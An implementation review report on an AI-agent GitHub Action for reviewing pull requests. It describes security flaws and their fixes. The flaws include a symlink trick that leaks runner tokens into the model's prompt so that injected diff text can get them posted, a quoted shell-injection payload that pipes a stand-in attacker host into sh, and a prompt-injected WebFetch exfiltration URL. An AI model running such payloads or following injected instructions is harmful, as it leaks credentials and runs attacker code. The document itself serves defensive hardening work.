<!-- IMPL-REVIEW-REPORT -->
# Implementation Review: PR Review Action — reusable composite GitHub Action

- **Plan**: `context/changes/ai-code-review/plan.md`
- **Scope**: Phases 10-12 of 12, plus post-review commits `49e762b`, `faa40fd`, `d16ca6a`
- **Date**: 2026-07-31
- **Verdict**: REJECTED → **RESOLVED** after triage on 2026-08-01
- **Findings**: 1 critical, 8 warnings, 1 observation
- **Triage**: 10 of 10 addressed — 9 fixed, 1 (F6) partially fixed with the
  retry half deliberately deferred. Gates after triage: `uv run pytest` 114
  passed / 3 skipped (was 78/1), `ruff check` clean, `ruff format --check` clean,
  `pyright` 0 errors.

## Scope note

Phases 0-3 and 4-9 already have triaged reviews (`impl-review-phases-0-3.md`,
`impl-review-phases-4-9.md`), so plan-drift analysis targeted phases 10-12 and
the four commits landed after the last triage. The safety/quality sweep and
success-criteria verification covered the whole repository.

## Success criteria — re-run 2026-07-31

| Check | Result |
|---|---|
| `uv run pytest` | 78 passed, 1 skipped |
| `uv run ruff check .` | All checks passed |
| `uv run ruff format --check .` | 28 files already formatted |
| `uv run pyright` | 0 errors, 0 warnings, 0 informations |

All Progress checkboxes across all 12 phases are `[x]`, with commit SHAs
attached. Manual items 10.1, 11.1, 12.1 and 12.2 have observable evidence in
the diff and in `change.md`'s record of the live PR #10 run.

Both open user action items from the phases 4-9 review are resolved:
`token.txt` is gone from the repo root and `.gitignore:234-237` now covers
`token.txt` / `*.token` / `secrets*` / `.env`; `tests/fixtures/smoke-criteria.md`
is tracked.

`action.yml` matches the plan's Phase 10 draft input-for-input — all 18 declared
inputs are forwarded, `--project` is used in both steps, `--directory` appears
nowhere in the repo, and both third-party actions are SHA-pinned.

## Verdicts

| Dimension | Verdict |
|-----------|---------|
| Plan Adherence | FAIL |
| Scope Discipline | WARNING |
| Safety & Quality | FAIL |
| Architecture | PASS |
| Pattern Consistency | WARNING |
| Success Criteria | PASS |

## Findings

### F1 — A symlink in the PR head defeats base-ref sourcing of the rules file

- **Severity**: ❌ CRITICAL
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: `src/pr_review_agent/cli.py:166-180`, consumed at `:229-232`
- **Detail**: The F4 amendment from the phases 4-9 review classifies each
  review-input path as "inside the checkout → fetch from the base ref
  (trusted)" vs. "outside the checkout → read from disk (caller's authority)".
  The classifier is `_repo_relative`, which calls `path.resolve()` — and
  `resolve()` follows symlinks:

  ```python
  return path.resolve().relative_to(repo_root.resolve()).as_posix()
  ...
  if trust_head or relative is None:
      return path.read_text(encoding="utf-8")
  ```

  The checkout is the PR *head*, so the PR author controls what symlinks exist
  in it. An in-repo path that is a symlink pointing outside the root resolves
  outside, returns `None`, and is therefore promoted to the *higher* trust
  level — read straight off disk through the symlink and interpolated verbatim
  into the system prompt under `## Repository Rules`. The trust decision is
  made from the one input the attacker fully controls, and it fails open.

  Failure scenario: `--rules-file AGENTS.md` is the default (`cli.py:329`,
  `action.yml:13`), so no unusual config is needed. A PR replaces `AGENTS.md`
  with a symlink to `/proc/self/environ`. `actions/checkout` materializes it.
  The reviewing process's own environment — `GH_TOKEN`, `ANTHROPIC_AUTH_TOKEN`
  (`action.yml:79-82`) — lands in the system prompt, and the attacker-authored
  diff in the user prompt can steer the model into quoting it in a
  `submit_finding` comment posted to the PR. `redact()` covers
  `ghs_`/`sk-ant-`/`sk-or-v1-` shapes but not an arbitrary gateway token, and
  not the rest of the runner environment. `~/.ssh/*` and `/etc/passwd` are
  equally reachable. `test_cli.py:387` pins only the non-symlink case.

  This is a different code path from `_make_repo_path_guard`
  (`review_agent.py:310-376`), whose resolve-then-compare *is* correct — there,
  resolving outside the root means deny.
- **Fix**: In `_load_review_input`, treat "inside the checkout by literal path
  but resolving outside it" as a hard error rather than a promotion to trusted.
  When `trust_head` is false, reject the path if `path` (or any component) is a
  symlink, or if the literal non-resolved path is under `repo_root` while
  `path.resolve()` is not. Add a test that plants `AGENTS.md -> /etc/hostname`
  under `tmp_path` and asserts the disk read never happens.
  - Strength: Closes an arbitrary-local-file-read into the highest-authority
    prompt position, on the default configuration.
  - Tradeoff: Needs a decision on error-vs-degrade for the rejected path.
  - Confidence: HIGH — verified by reading both code paths.
  - Blind spot: None significant.
- **Decision**: FIXED — `_repo_relative` now classifies lexically via
  `os.path.abspath` (so a head symlink can no longer move the trust decision),
  and the new `_reject_symlink_escape` raises `OSError` → exit 3 for an in-repo
  path that resolves outside the checkout. Two tests added in `test_cli.py`;
  they skip on Windows (no symlink privileges) and run on the Linux CI runner.
  Guard behavior verified locally via a directory junction.

### F2 — README was never written; Risk #11's only mitigation does not exist

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Plan Adherence
- **Location**: `README.md:1-8`
- **Detail**: Still the Phase-0 stub: "Usage, inputs, and setup instructions
  will be filled in once the CLI (Phase 8) and composite action definition
  (Phase 10) exist." Both now exist. `git log -- README.md` returns exactly one
  commit (`0ae9e32`).

  `plan.md:838-849` makes the README a Phase 8 deliverable: setup, the
  criteria-file prerequisite, a usage example, the `--publish` warning, the
  fork-PR limitation, "no default `scope-dirs`/`exclude`", and the Anthropic
  auth choice. None of it is there.

  The consequential part is Risk #11 (`plan.md:1120-1128`), which explicitly
  chooses documentation *instead of* code validation: "Mitigated by an explicit
  README warning (Phase 8) rather than code-level validation, since `cli.py`
  never touches these vars itself." Nothing in `action.yml` or `cli.py`
  validates the pair. A consumer who sets `anthropic-api-key` alongside
  `anthropic-base-url`/`anthropic-auth-token` gets their gateway silently
  bypassed, with no error anywhere and an unexpected direct-Anthropic bill.

  Root cause of the miss: no Progress checkbox under Phase 8 covers the README,
  so nothing gated it.
- **Fix A ⭐ Recommended**: Write the README to `plan.md:838-849`'s spec now, and
  add a Progress item under Phase 8 for it.
  - Strength: Restores the mitigation the plan explicitly relied on; the action
    is currently unadoptable by any third party without it — every "Follow-up /
    Out of Scope" item assumes consumers read this file.
  - Tradeoff: A real writing task, not a one-liner.
  - Confidence: HIGH — the required contents are enumerated in the plan.
  - Blind spot: None significant.
- **Fix B**: Add code-level validation in `cli.py` for the both-set case and
  keep the README minimal.
  - Strength: A hard failure beats a documented warning nobody reads.
  - Tradeoff: Reverses a documented Key Decision, and `cli.py` deliberately
    never touches these env vars today; the rest of the README gap (usage, fork
    limitation, publish warning) stays open.
  - Confidence: MEDIUM — would need care not to break the gateway path.
  - Blind spot: Haven't checked whether the CLI can see the vars early enough
    to fail fast without duplicating SDK precedence logic.
- **Decision**: FIXED via Fix A — `README.md` rewritten to `plan.md:838-849`'s
  spec (criteria-file prerequisite + base-ref sourcing, usage example, inputs
  table, Anthropic auth with the both-set warning, publish warning, fork-PR
  limitation, no-default-scope note, artifacts, exit codes, local dev). Progress
  item 8.5 added under Phase 8 so the gap can't recur silently.

### F3 — action.yml interpolates every input into a bash script body

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: `action.yml:83-97`
- **Detail**: `${{ }}` expressions are substituted textually *before* bash
  parses the script, so the surrounding double quotes give no protection:

  ```yaml
  --pr "${{ inputs.pr-number }}" \
  --model "${{ inputs.model }}" --format "${{ inputs.format }}" \
  ```

  A consumer wiring this into a `/review`-comment workflow — `scope-dirs: ${{
  github.event.comment.body }}` or `repo: ${{ github.event.issue.title }}`,
  both common patterns — hands an attacker a shell. A comment reading
  `src"; curl -s attacker/x | sh; echo "` closes the quote and runs arbitrary
  commands on the runner, with `GH_TOKEN` and the Anthropic token already
  exported into that step's env (`action.yml:78-82`). Benignly, any input
  containing a `"` breaks the invocation with an opaque bash error.

  Inherited from the plan — `plan.md:927-941` specifies exactly this shape — so
  the plan is wrong here, not just the implementation.
- **Fix**: Move every input into the step's `env:` block (`INPUT_PR_NUMBER: ${{
  inputs.pr-number }}` …) and reference them as `"$INPUT_PR_NUMBER"` in the
  script. Update `plan.md`'s Phase 10 draft to match. GitHub's documented
  hardening pattern; costs nothing here.
- **Decision**: FIXED — all 14 inputs plus `ACTION_PATH` now reach the script
  through `env:`; no `${{ }}` remains inside either `run:` body. Conditional
  flags are assembled into a bash array (`if` blocks, not `[ … ] &&`, so
  `set -e` can't abort on a false test). `plan.md`'s Phase 10 draft amended with
  the new shape and the rationale. Verified by extracting the script and
  running it against a stubbed `uv`: minimal, all-inputs-set, and an injection
  payload (`src"; echo PWNED; echo "`) which arrives as one literal argv
  element.

### F4 — A hallucinated line number discards the entire review at publish time

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: `src/pr_review_agent/review_agent.py:190-197`;
  `src/pr_review_agent/diff_parser.py:39-40, 115-135`
- **Detail**: `ChangedFile.added_line_numbers` / `removed_line_numbers` are
  computed for every file and consumed by *nothing* in `src/` — grep finds them
  only in `diff_parser.py` itself and in tests. They are precisely the data
  needed to reject a bad `Finding.line` before it reaches GitHub.

  `submit_finding` validates only that `line` is an `int`. A finding at line 87
  of a file whose diff covers lines 1-40 is accepted, deduplicated, capped,
  written to the artifact, and posted — where GitHub rejects the *entire*
  `create_review` call with 422 "Line could not be resolved", discarding the
  summary and every valid inline comment, and exiting 6.

  Not hypothetical: `diff_parser.py:57-66` documents this exact 422 as a live
  incident, and the fix chosen then (line-annotated `hunks_text`) makes it less
  likely without making it impossible.
- **Fix**: Thread `list[ChangedFile]` into `run_review` and have
  `submit_finding` return `is_error: True` ("line 87 is not part of the diff for
  api/handler.py; valid RIGHT lines are …") when `line` isn't in the matching
  side's list. Converts a fatal publish failure into a model retry, using data
  already being computed.
- **Decision**: FIXED — `changed_files: list[ChangedFile]` now threads
  `cli.py:in_scope` → `run_review` → `_build_options` →
  `_make_submit_finding_tool`. New `_anchor_error` rejects an unknown path, a
  line absent from the matching side's list, and a file with no lines on that
  side; messages list the valid anchors, capped at `_MAX_LISTED_ANCHORS = 20`.
  The `line` schema description now tells the model to read the pre-annotated
  number rather than count. New `tests/test_review_agent.py` covers all six
  cases (6 tests). Note: findings on `--exclude`/`--scope-dirs`-filtered files
  are now rejected too, which is the desired behavior.

### F5 — Glob's `pattern` bypasses the repo path guard

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: `src/pr_review_agent/review_agent.py:61-64`, guard at `:348-374`
- **Detail**:

  ```python
  _PATH_ARG_NAMES = ("file_path", "path")
  ```

  The accompanying comment — "Anything else they accept (`pattern`, `glob`) is
  matched against contents or names, not resolved as a filesystem location" —
  is right for Grep but wrong for Glob, whose `pattern` *is* the path selector.
  The guard's loop `continue`s on an absent argument, so a Glob call with no
  `path` key at all is allowed unconditionally and its pattern is never
  examined.

  Failure scenario: `Glob(pattern="/home/runner/**/*")` or
  `Glob(pattern="../../../**/*.pem")` returns a directory listing from outside
  `repo_root`. File *contents* stay protected (a follow-up `Read` is caught),
  so this is layout disclosure rather than data disclosure — but it is a hole
  in a boundary the module's own docstring calls "the boundary that stops it."
- **Fix**: For Glob, resolve `pattern`'s longest non-wildcard prefix against
  `path or repo_root` and apply the same containment test; fail closed when
  neither `path` nor a containable prefix is present.
- **Decision**: FIXED — new `_glob_pattern_denial` runs when
  `tool_name == "Glob"`: the pattern's literal prefix (`_glob_literal_prefix`,
  which treats `\` as a separator too) is anchored against `path` when given and
  `repo_root` otherwise, then held to the same containment rule via the
  extracted `_outside_root`. A rooted pattern with no literal prefix
  (`/**/*.pem`) is denied outright. Grep's `pattern` is deliberately untouched —
  it is a contents regex, and a test pins that a regex like
  `/etc/passwd|../../secret` is still allowed. 11 guard tests added.
  The `/**/*.pem` case initially slipped through on Windows, where
  `Path("/x").is_absolute()` is False; rooted-ness is now detected from a
  leading separator instead.

### F6 — No retry at any GitHub boundary; a rate-limit 403 is reported as a permissions problem

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: `src/pr_review_agent/github_diff.py:134-155`;
  `src/pr_review_agent/github_publish.py:172-176`
- **Detail**: The client carries a 60s timeout (`github_diff.py:118`) — good —
  but all five API touch points are single-shot: no retry for 5xx, 429, or
  timeout. A transient 502 on `post_review` costs the entire model run: the
  agent completed, the tokens are paid for, and the review is lost with exit 6.

  Separately, GitHub's secondary rate limit returns **403**, which
  `_raise_for_github_error` maps to "GitHub rejected the token … Check that the
  token is valid and has `pull-requests: read`" — sending the operator to fix a
  permission that was never wrong.
- **Fix**: Wrap the five call sites in a shared bounded retry (3 attempts,
  exponential backoff with jitter) for 429/5xx/timeout, honouring `Retry-After`;
  and distinguish 403-with-`Retry-After` (or `x-ratelimit-remaining: 0`) from
  403-permissions in the error mapping.
- **Decision**: PARTIALLY FIXED — error mapping only; **the retry half was
  deliberately skipped** and remains open. New shared `rate_limit_reason()` in
  `github_diff.py` reads `Retry-After` / `x-ratelimit-remaining: 0` (+ `-reset`)
  off the response; both `_raise_for_github_error` and `_raise_for_publish_error`
  now check it for 403 *and* 429 before falling through to their
  permissions/fork messages. The publish variant also points the operator at the
  saved local artifacts. 4 tests in `test_github_diff.py`.

  **Still open:** all five GitHub call sites remain single-shot, so a transient
  502 on `post_review` still loses a completed, paid-for review with exit 6.

### F7 — WebFetch is the one egress tool covered by neither list

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: `src/pr_review_agent/review_agent.py:45`
- **Detail**:

  ```python
  _DISALLOWED_TOOLS = ["Bash", "Write", "Edit", "NotebookEdit", "WebSearch", "Task"]
  ```

  `WebSearch` is listed, so web tools were considered — `WebFetch` was missed.
  Every other mutation/egress tool is covered twice (absent from
  `allowed_tools` *and* present in `disallowed_tools`, per the defense-in-depth
  rationale at `:437-441`); `WebFetch` is covered once. The PreToolUse hook
  doesn't help either — its matcher is `Read|Grep|Glob` (`:449`).

  Whether a prompt-injected agent can actually call
  `WebFetch(url="https://attacker/?d=<contents>")` therefore rests entirely on
  how the SDK treats an unlisted tool under `permission_mode="dontAsk"` — the
  single control this module's own comments say it deliberately does not rely
  on alone. The SDK's behavior here was not confirmed either way.
- **Fix**: Add `"WebFetch"` (and for symmetry `"SlashCommand"`, `"BashOutput"`,
  `"KillShell"`) to `_DISALLOWED_TOOLS`.
- **Decision**: FIXED — `_DISALLOWED_TOOLS` now names all ten mutation/egress
  tools (`Bash`, `BashOutput`, `KillShell`, `Write`, `Edit`, `NotebookEdit`,
  `WebFetch`, `WebSearch`, `SlashCommand`, `Task`), with a comment recording why
  `WebFetch` is the one that mattered. Parametrised test asserts each is in
  `disallowed_tools` and absent from `allowed_tools`.

### F8 — The two highest-risk modules have zero tests

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: `tests/` (no `test_review_agent.py`, no `test_github_publish.py`)
- **Detail**: Coverage elsewhere is genuinely good — `test_cli.py` exercises the
  whole exit-code contract and the base-ref sourcing; `test_diff_parser.py`
  covers truncation accounting. But `review_agent.py`'s security controls (the
  path guard, `setting_sources=[]`, `strict_mcp_config=True`, the tool-argument
  validators) and `github_publish.py`'s 422 downgrade are untested.

  The F2 fix from the last review is a two-line kwarg pair. Deleting
  `setting_sources=[]` during an SDK version bump — entirely plausible, since
  it reads like a default — re-opens full `.claude/settings.json` + `CLAUDE.md`
  + `.mcp.json` loading from the attacker-controlled head checkout, and every
  test still passes.

  The plan waived tests for `review_agent.py` on a "needs a live SDK
  connection" rationale (`plan.md:684-686`). That rationale doesn't cover
  `_build_options` or `_make_repo_path_guard`, which are pure functions.
- **Fix**: Three unit tests — (a) `_build_options(...)` returns
  `setting_sources == []` and `strict_mcp_config is True`; (b)
  `_make_repo_path_guard(tmp_path)` denies `file_path=/etc/passwd`, `path=../..`,
  and an out-pointing symlink, and allows an in-repo relative path; (c)
  `post_review` with a stubbed client reposts exactly once as `COMMENT` on the
  marker 422 and raises without retry on any other 422.
- **Decision**: FIXED — all three, across two new files. `test_review_agent.py`
  (25 tests) covers (a) `setting_sources == []` / `strict_mcp_config is True` /
  `permission_mode == "dontAsk"`, and (b) the path guard for `/etc/passwd`,
  `../..`, escaping globs and an in-repo allow — plus `_anchor_error` (F4) and
  the disallowed-tools list (F7). `test_github_publish.py` (5 tests) covers (c):
  one post on success, exactly two on the marker 422 with body/comments carried
  over, no third post when the retry fails, and no retry at all for any other
  422 or a 403. Suite is now 112 passed / 3 skipped, up from 78/1.

### F9 — d16ca6a's deleted-file behavior is undocumented in the plan

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Scope Discipline
- **Location**: `src/pr_review_agent/diff_parser.py:16, 119-124, 143-147`
- **Detail**: `git show d16ca6a` touched `diff_parser.py` and
  `test_diff_parser.py` only. Grepping `plan.md` for
  "deleted"/"placeholder"/"nothing to review" returns zero hits — Phase 2's
  bullets (`plan.md:483-505`) describe only the binary placeholder and the
  line-annotation amendment. Contrast `49e762b`, which correctly amended
  `plan.md` in the same commit.

  The change itself is correct and was verified: the `if not
  patched_file.is_removed_file:` guard sits outside the `for line in hunk:`
  loop, so `removed_line_numbers` is still populated
  (`test_diff_parser.py:56-60` asserts `[1, 2]`); `_file_header` still renders
  `(removed)`; `build_diff_context` accounting is unaffected since `_file_block`
  measures the now-shorter `hunks_text`; and there is a new dedicated test. The
  problem is only that the plan is no longer the source of truth for Phase 2's
  behavior.
- **Fix**: Add a bullet to `plan.md`'s Phase 2 describing the deleted-file
  placeholder, tagged with the date and commit, matching how the line-annotation
  fix was recorded.
- **Decision**: FIXED, and widened. Phase 2 gained the deleted-file placeholder
  bullet (tagged `d16ca6a`, 2026-07-31). Since this triage changed Phase 5
  behavior too, the same pass recorded F4 (anchor validation on `submit_finding`
  + the new `changed_files` parameter), F7 (completed `disallowed_tools`), F5
  (Glob `pattern` containment) and F8 (the "no unit tests for this module"
  bullet, now struck through and superseded). Phase 10's `action.yml` draft was
  amended under F3, and Phase 8 gained the README checkbox under F2 — the plan
  is source of truth again for every phase this triage touched.

### F10 — Consolidated minor items

- **Severity**: 📝 OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fixes are obvious and narrowly scoped
- **Dimension**: Pattern Consistency / Safety & Quality
- **Location**: multiple, listed below
- **Detail**:
  - **a.** `--publish --format all` never prints the console output —
    `cli.py:553` returns `EXIT_SUCCESS` inside the `if args.publish:` block,
    before the `format in ("console", "all")` branch at `:565`.
  - **b.** Four status `print()`s on stdout (`cli.py:432`, `:442`, `:497`,
    `:560`) — `AGENTS.md:29-30` reserves stdout for review output. Under
    `--format json` these are the only thing on stdout. `output.py`'s prints
    are the legitimate output channel.
  - **c.** `_post` (`github_publish.py:110-121`) has `Args:` but no
    `Returns:`/`Raises:` despite propagating
    `RequestFailed`/`RequestTimeout`/`RequestError` — the one gap against the
    project's own docstring rule. Everything else in all eight modules carries
    a complete Google-style docstring.
  - **d.** The APPROVE→COMMENT retry (`github_publish.py:175`) is not gated on
    `payload["event"] == APPROVE`, despite the docstring at `:141` promising it
    is. One comparison; unreachable in practice today.
  - **e.** `except OSError` around `resolve()` (`review_agent.py:360`) misses
    `ValueError: embedded null byte`, which POSIX raises for a NUL in a path —
    the exception escapes the hook instead of denying.
  - **f.** Six `GitHub` clients and six truststore SSL contexts are built per
    run (`build_client` called independently in `get_pr_metadata`,
    `get_pr_diff`, three `get_file_at_ref` calls, `post_review`). No connection
    reuse.
  - **g.** `redact(exc.response.text[:500])` (`github_diff.py:149`,
    `github_publish.py:81`) truncates before redacting; a token straddling the
    boundary loses the `{20,}` match. Redact first — it's free.
  - **h.** `pr_metadata.files` is fully paginated (up to 30 calls) and used only
    for `if not pr_metadata.files:` at `cli.py:441` — which runs *after*
    `get_pr_diff`, so a no-op PR pays for both.
  - **i.** `self-test.yml`'s dogfood job runs `uses: ./` on `pull_request`, so
    the action source is the PR under review while `OPENROUTER_API_KEY` is in
    scope. Bounded to contributors with push access (forks get no secrets), but
    for those any PR can exfiltrate the key.
- **Fix**: Address individually during triage; none are coupled.
- **Decision**: FIXED — all nine.
  - **a.** `print_console` gained a `published` flag; the publish path now
    renders console output under `--format console|all` with a
    `=== PUBLISHED TO GITHUB ===` banner instead of the dry-run one. Test added.
  - **b.** All four `print()`s in `cli.py` are `logger.info` (stderr). The
    package logger is INFO by default, so nothing became invisible. Test asserts
    stdout is empty under `--format json` on the closed-PR path.
  - **c.** `_post` gained `Returns:` and `Raises:`
    (`RequestFailed`/`RequestTimeout`/`RequestError`).
  - **d.** The APPROVE→COMMENT retry is now gated on
    `posted_event != ReviewEvent.APPROVE` as well as the marker, making the
    docstring's promise true in code.
  - **e.** Both `resolve()` call sites in the path guard catch
    `(OSError, ValueError)`; the NUL-byte `ValueError` no longer escapes the
    hook undenied. Documented on `_outside_root`'s `Raises:`.
  - **f.** `build_client` is `@lru_cache(maxsize=1)`d — one client and one
    truststore context per run instead of six.
  - **g.** `redact(text)[:500]` in both modules; a token straddling the old
    boundary is no longer truncated out of the `{20,}` match.
  - **h.** `PullRequestMetadata.files` (paginated, up to 30 API calls) is now
    `changed_file_count: int` from `pulls.get`'s own `changed_files`. The only
    consumer was an emptiness check.
  - **i.** Both `self-test.yml` jobs carry
    `if: github.event.pull_request.head.repo.full_name == github.repository`
    plus a SECURITY comment stating the exposure precisely. **Residual risk
    remains:** a contributor with push access can still read
    `OPENROUTER_API_KEY` by editing the action in a PR. The durable fix is a
    repository environment holding the secret with required reviewers, then
    `environment: dogfood` on both jobs — that needs a repo-settings change
    outside this repo's files.
  - Plan amended for a/b (Phase 8 orchestration) and f/h (Phase 3).

## Prior-review fixes confirmed intact

- **F2 (phases 4-9), SDK setting sources** — `review_agent.py:441-442` sets
  `setting_sources=[]` and `strict_mcp_config=True`. `permission_mode` is
  `"dontAsk"`, never `bypassPermissions`. No other `ClaudeAgentOptions`
  construction exists.
- **Untrusted diff → user prompt only.** `build_system_prompt`
  (`agents_context.py:227`) composes only role text + criteria + rules +
  lessons. The diff and PR title go through `_build_user_prompt`
  (`review_agent.py:457`), fenced in `<<<UNTRUSTED_PR_CONTENT>>>` with an
  explicit data-not-instructions preamble.
- **Closed/merged guard** fires at `cli.py:430`, before `get_pr_diff` at
  `:436`; tested at `test_cli.py:224`.
- **Artifact ordering** — `_write_artifacts` (`cli.py:527`) runs before the
  verdict check (`:532`) and before publish (`:553`); `_ensure_json_artifact`
  writes JSON unconditionally on both the exit-5 and exit-6 paths regardless of
  `--format` (`:541`, `:557`); tested at `test_cli.py:339`, `:361`.
- **`redact()` prefix coverage** (`logging_config.py:13-17`) covers
  `gh[pousr]_`, `github_pat_`, `sk-ant-`, `sk-or-(v\d+-)?`, and `Bearer `. The
  filter sits on the handler shared by the root and package loggers, so
  githubkit/httpx/SDK records pass through it, and `_RedactingFormatter`'s
  `formatException` closes the traceback bypass.
